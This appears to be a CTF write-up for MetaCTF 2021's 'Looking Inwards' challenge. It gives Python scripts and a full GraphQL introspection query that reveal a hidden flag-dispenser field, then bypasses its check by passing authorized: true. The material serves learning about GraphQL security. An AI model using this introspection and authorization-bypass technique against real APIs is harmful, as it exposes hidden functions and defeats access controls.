# MetaCTF 2021

## Looking Inwards (300pts)

### Description:

> It's always fun to take a moment of introspection, in this case not about oneself, but about our field (development/security). For example when it comes to API design, first there were SOAP endpoints primarily based on XML. Then as Web 2.0 came along, RESTful APIs became all the rage. Recently, technologies like GraphQL began to gain traction.

> With new technologies, though, come new classes of attacks. Check out this basic [GraphQL API server](https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php). To get you started, here's one cool thing it can do: If you send it a `query` in the form of `echo(message: "message_here")`, it will respond with what you said. Can you get it to give you the flag?

### Step 1 - Sending a Query to the GraphQL API

Before we could attempt to find the flag, first we wanted to get a valid response back from the GraphQL server using the query `echo(message: "message_here")` which was provided in the challenge description.

We used the following [tutorial](https://towardsdatascience.com/connecting-to-a-graphql-api-using-python-246dda927840) from `Towards Data Science` which walked us through how to send a GraphQL request using Python. Below allowed us to send that query.

```python
import requests
import pandas as pd

query = '''query {
	echo(message: "message_here")
}'''

url = 'https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php'
r = requests.post(url, json={'query': query})
print(r.text)
```

Output:

```JSON
{"data":{"echo":"You said: message_here"}}
```

### Step 2 - Find Other Endpoints on GraphQL API

After a bit of research, we learned we can use a technique called `introspection` on GraphQL APIs to find other endpoints. Using the following [tutorial](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/) from `Yes We Hack`, they included the following request:

```
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

After putting this request into our script from the previous step, we found the following in the output:

```JSON
{
    "name": "super_super_secret_flag_dispenser",
    "description": null,
    "args": [{
        "name": "authorized",
        "description": null,
        "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
                "kind": "SCALAR",
                "name": "Boolean",
                "ofType": null
            }
        },
        "defaultValue": null
    }],
    "type": {
        "kind": "NON_NULL",
        "name": null,
        "ofType": {
            "kind": "SCALAR",
            "name": "String",
            "ofType": null
        }
    },
    "isDeprecated": false,
    "deprecationReason": null
    }],
    "inputFields": null,
    "interfaces": [],
    "enumValues": null,
    "possibleTypes": null

}
```
This shows that there is an endpoint called `super_super_secret_flag_dispenser` that takes in a boolean called `authorized`.

## Step 3 - Retrieving the Flag

Using the information from the previous step, we crafted the following query:

```
query {
    super_super_secret_flag_dispenser(authorized: true)
}
```

Our final script looks like this:

```Python
import requests
import pandas as pd

query = '''query{
    super_super_secret_flag_dispenser(authorized: true)
}'''

url = 'https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php'
r = requests.post(url, json={'query': query})
print(r.text)
```
